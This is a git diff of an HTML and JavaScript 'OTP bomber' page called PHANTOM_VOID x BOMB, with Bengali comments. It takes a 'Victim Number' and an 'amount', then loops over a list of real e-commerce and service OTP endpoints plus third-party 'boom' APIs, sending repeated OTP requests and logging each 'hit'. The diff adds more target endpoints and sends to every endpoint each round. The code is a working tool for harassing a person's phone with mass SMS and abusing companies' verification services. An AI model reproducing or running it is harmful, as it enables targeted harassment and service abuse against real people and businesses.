@@ -3,66 +3,88 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>PHANTOM_VOID - ULTIMATE BOMB</title>
+  <title>PHANTOM_VOID;</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
     body { background: #0f0f0f; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
     #particles-js { position: absolute; width: 100%; height: 100%; z-index: 0; }
-    .container { z-index: 1; background: rgba(20, 20, 20, 0.95); padding: 30px; border-radius: 15px; box-shadow: 0 0 20px #ff0000a0; text-align: center; width: 90%; max-width: 400px; border: 1px solid #ff000055; }
+    .container { 
+      z-index: 1; background: rgba(20, 20, 20, 0.95); padding: 30px; border-radius: 15px; 
+      box-shadow: 0 0 20px #ff0000a0; text-align: center; width: 90%; max-width: 400px;
+      border: 2px solid #ff0000; 
+    }
     input, button { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 8px; outline: none; }
     input { background: #1f1f1f; color: #fff; box-shadow: 0 0 5px #ffaa00; text-align: center; }
-    button { background: #ff0000; color: white; font-weight: bold; box-shadow: 0 0 10px #ff0000; cursor: pointer; transition: 0.3s ease; }
+    button { 
+      background: #ff0000; color: white; font-weight: bold; 
+      box-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; cursor: pointer; transition: 0.3s ease; 
+    }
     button:hover { background: #cc0000; box-shadow: 0 0 20px #ff0000; }
-    #attackLogs { max-height: 130px; overflow-y: auto; background: #1a1a1a; padding: 10px; border-radius: 10px; margin-top: 15px; font-size: 13px; text-align: left; color: #00ff00; border: 1px solid #333; }
-    #countdownTimer { font-size: 15px; color: #ffaa00; margin-top: 10px; }
+    #attackLogs { 
+      max-height: 130px; overflow-y: auto; background: #1a1a1a; padding: 10px; 
+      border-radius: 10px; margin-top: 15px; font-size: 14px; text-align: left;
+      box-shadow: inset 0 0 10px #ff000055; color: #ffaa00;
+    }
     .alert { font-size: 16px; margin-top: 10px; }
     .success { color: #00ff00; }
     .failure { color: #ff3333; }
+    .default { color: #ffaa00; }
   </style>
 </head>
 <body>
   <div id="particles-js"></div>
   <div class="container">
-    <h1>PHANTOM_VOID</h1>
-    <p style="font-size: 10px; color: #ff0000;">GLOBAL STRIKE SYSTEM</p>
-    <input type="text" id="phoneNumber" placeholder="Victim Number (01XXX)">
+    <h1 style="color: #fff; text-shadow: 0 0 10px #ff0000;">PHANTOM_VOID x BOMB</h1>
+    <input type="text" id="phoneNumber" placeholder="Victim Number +88">
     <input type="number" id="amount" placeholder="Booming Amount">
     <button onclick="sendOTP()">START ATTACK</button>
-    <div id="countdownTimer"></div>
-    <div id="responseMessage" class="alert">System Ready...</div>
+    <div id="responseMessage" class="alert default">System Loaded...</div>
     <div id="attackLogs"></div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
   <script>
+    // আপনার বন্ধুর কোডের অরিজিনাল থিম
     particlesJS("particles-js", {
       particles: {
-        number: { value: 120 },
-        color: { value: "#ff0000" },
-        opacity: { value: 0.5 },
+        number: { value: 150 },
+        color: { value: "#ff0033" },
+        shape: { type: "circle" },
+        opacity: { value: 2 },
         size: { value: 3 },
-        line_linked: { enable: true, color: "#ff0000", opacity: 0.4, width: 1 },
-        move: { enable: true, speed: 4 }
+        move: { enable: true, speed: 5 },
+        line_linked: { enable: true, color: "#00ffff", opacity: 0.9, width: 1 }
+      },
+      interactivity: {
+        events: { onhover: { enable: true, mode: ["repulse", "bubble"] } }
       }
     });
+
+    async function sendRequest(url, method = 'GET', data = null) {
+      try {
+        let options = { method, headers: { 'Content-Type': 'application/json' } };
+        if (data) options.body = JSON.stringify(data);
+        let res = await fetch(url, options);
+        return res.status >= 200 && res.status < 300;
+      } catch (e) { return false; }
+    }
 
     async function sendOTP() {
       const phone = document.getElementById('phoneNumber').value;
       const amount = parseInt(document.getElementById('amount').value);
       const logs = document.getElementById('attackLogs');
       const responseMessage = document.getElementById('responseMessage');
-      const timerDisplay = document.getElementById('countdownTimer');
 
-      if (!/^01\d{9}$/.test(phone) || isNaN(amount)) {
-        responseMessage.innerHTML = '<span class="failure">Invalid Input!</span>';
+      if (!/^\d{11}$/.test(phone) || amount <= 0) {
+        responseMessage.innerHTML = '<span class="failure">Invalid Number or Amount!</span>';
         return;
       }
 
-      responseMessage.innerHTML = '<span style="color: #ffaa00;">Attack Initiated...</span>';
+      responseMessage.innerHTML = 'Attack Started...';
       logs.innerHTML = '';
 
-      // আপনার দেওয়া প্রতিটি API এখানে সিরিয়াল অনুযায়ী আছে
+      // আপনার দেওয়া প্রতিটি API এখানে সিরিয়াল অনুযায়ী যুক্ত করা হয়েছে
       let apis = [
         { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
         { url: `https://lmnx9.xyz/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
@@ -89,11 +111,27 @@
         { url: `https://api.foodpanda.com.bd/api/v2/otp`, method: 'POST', data: { phone: phone } },
         { url: `https://api.sheba.xyz/v1/user/otp`, method: 'POST', data: { phone: phone } },
         { url: `https://api.ajkerdeal.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.shwapno.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.evaly.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
         { url: `https://api.rokomari.com/v1/user/otp`, method: 'POST', data: { phone: phone } }
       ];
 
+      const msgList = ["Boom Sent!", "Direct Hit!", "Reloading...", "Blast Sent!"];
       let successCount = 0;
-      for (let i = 1; i <= amount; i++) {
-        let api = apis[(i - 1) % apis.length];
-        try {
-          let options = { method: api.method, headers: { 'Content
+
+      for (let i = 0; i < amount; i++) {
+        for (let api of apis) {
+          let result = await sendRequest(api.url, api.method, api.data);
+          let randomMsg = msgList[Math.floor(Math.random() * msgList.length)];
+          logs.innerHTML += `[${new Date().toLocaleTimeString()}] ${randomMsg} ${result ? "✅" : "❌"}<br>`;
+          logs.scrollTop = logs.scrollHeight;
+          if (result) successCount++;
+          await new Promise(res => setTimeout(res, 100)); // সার্ভার ওভারলোড এড়াতে সামান্য গ্যাপ
+        }
+      }
+
+      responseMessage.innerHTML = `<span class="success">Attack Completed! (${successCount} Hits)</span>`;
+    }
+  </script>
+</body>
+</html>
